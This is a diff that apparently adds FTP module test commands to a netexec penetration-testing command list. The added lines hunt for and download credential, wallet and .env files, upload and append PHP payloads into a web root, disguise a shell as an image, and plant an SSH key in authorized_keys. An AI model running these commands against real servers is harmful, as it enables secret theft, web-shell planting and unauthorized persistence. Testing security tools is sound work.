@@ -302,6 +302,19 @@ netexec ftp TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD --get test_file.txt
 netexec ftp TARGET_HOST -u TEST_USER_FILE -p TEST_PASSWORD_FILE --no-bruteforce
 netexec ftp TARGET_HOST -u TEST_USER_FILE -p TEST_PASSWORD_FILE --no-bruteforce --continue-on-success
 netexec ftp TARGET_HOST -u TEST_USER_FILE -p TEST_PASSWORD_FILE
+##### FTP Modules
+netexec ftp TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD -M enum_ftp
+netexec ftp TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD -M enum_ftp -o TEXT=pass,db,.sql,.env,config,wallet DOWNLOAD=yes
+netexec ftp TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD -M enum_ftp -o PERM=700+ DOWNLOAD=yes
+netexec ftp TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD -M enum_ftp -o PATH=/var/www/html DEPTH=8 TEXT=.php,.env,.git DOWNLOAD=yes
+netexec ftp TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD -M ftp_info
+netexec ftp TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD -M actions_ftp -o ACTION=upload LOCAL=./l.php REMOTE=/var/www/html/
+netexec ftp TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD -M actions_ftp -o ACTION=append LOCAL=./evil.php DST=/var/www/html/index.php
+netexec ftp TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD -M actions_ftp -o ACTION=rename SRC=/var/www/html/shell.php DST=/var/www/html/logo.jpg
+netexec ftp TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD -M actions_ftp -o ACTION=chmod FILE=/var/www/html/logo.jpg PERM=755
+netexec ftp TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD -M actions_ftp -o ACTION=append LOCAL=./id_rsa.pub DST=/home/user/.ssh/authorized_keys
+netexec ftp TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD -M actions_ftp -o ACTION=download FILE=/home/user/.env
+netexec ftp TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD -M enum_ftp -M ftp_info -M actions_ftp -o ACTION=upload LOCAL=./l.php REMOTE=/tmp/
 ##### NFS
 netexec nfs TARGET_HOST -u "" -p "" --shares
 netexec nfs TARGET_HOST -u "" -p "" --enum-shares
